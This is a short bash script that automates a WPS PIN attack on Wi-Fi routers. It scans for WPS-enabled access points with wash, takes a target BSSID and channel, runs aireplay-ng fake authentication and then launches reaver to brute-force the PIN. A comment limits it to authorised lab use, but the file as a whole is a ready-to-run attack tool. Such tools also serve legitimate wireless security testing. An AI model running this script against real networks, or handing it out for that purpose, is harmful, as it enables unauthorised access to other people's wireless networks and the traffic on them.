#!/usr/bin/env bash
# wps_reaver.sh
# Last Edited by Charles Duoto on November 16, 2026
# Scan for WPS-enabled APs with wash, fakeauth, then run reaver.
# Pure bash. Interface must be in monitor mode.
# Authorized lab environments only.
#
# Usage:
#   sudo ./wps_reaver.sh wlan0

set -euo pipefail

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <monitor_interface>"
    echo "Example: $0 wlan0"
    exit 1
fi

IFACE="$1"

echo "[*] Scanning for WPS-enabled networks (wash)..."
echo "[*] Press Ctrl+C after a few seconds once you see your target."
wash -i "$IFACE"

echo
read -rp "Enter target BSSID: " BSSID
read -rp "Enter channel: " CHANNEL

if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
    echo "[-] BSSID and channel required."
    exit 1
fi

# Get our adapter MAC
OUR_MAC=""
if [[ -f "/sys/class/net/$IFACE/address" ]]; then
    OUR_MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ip link show "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    echo "[-] Could not determine MAC of $IFACE"
    exit 1
fi

echo
echo "[*] Target : $BSSID on channel $CHANNEL"
echo "[*] Adapter: $OUR_MAC"
echo "[*] Locking channel..."
iwconfig "$IFACE" channel "$CHANNEL" 2>/dev/null || iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null || true

echo "[*] Running fake auth (30 attempts)..."
aireplay-ng --fakeauth 30 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true

echo
echo "[*] Starting reaver..."
echo "[*] Press Ctrl+C to stop."
reaver --bssid "$BSSID" --channel "$CHANNEL" --interface "$IFACE" -vv
